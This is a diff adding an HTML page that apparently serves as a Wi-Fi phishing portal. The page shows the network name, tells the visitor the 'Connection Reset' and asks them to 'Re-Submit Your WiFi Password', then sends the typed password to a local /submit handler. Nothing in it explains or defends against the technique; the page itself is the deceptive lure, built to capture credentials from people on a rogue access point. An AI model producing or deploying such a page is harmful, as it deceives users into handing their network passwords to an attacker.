@@ -1,0 +1,23 @@
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<h1 id="ssid">ssid</h1>
+<div class="login" >Connection Reset <br> Please Re-Submit Your WiFi Password</h1>
+  <form action='/submit' method='get'>
+    
+    <p style="margin: 20px 0 0;"><input type=password name=password value placeholder="Password" ></p>
+    <p class="remember_me" >
+        <input type="checkbox" >
+        Remember me on this computer
+      </label>
+    </p><input type="hidden" id="isURL" name="url" value="">
+    <p class="submit" ><input type=submit name="commit" value="Connect" ></p>
+  </form>
+</div>
+ 
+
+<script src="/index.js"></script>
+</body>
+</html>
